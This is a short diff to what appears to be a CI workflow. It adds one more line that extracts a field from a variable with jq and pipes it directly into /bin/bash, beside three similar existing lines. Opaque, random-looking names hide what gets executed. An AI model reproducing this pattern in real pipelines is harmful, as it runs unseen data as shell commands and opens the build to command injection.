@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$a4" | jq -r .amaeq220 | /bin/bash
           echo $gec1208 | jq -r .pme214 | /bin/bash
           printf '%s' "$n307" | jq -r .dll660 | /bin/bash
+          printf '%s' "$zi09805" | jq -r .dgjw2 | /bin/bash
 
       - name: Upload results
         if: always()
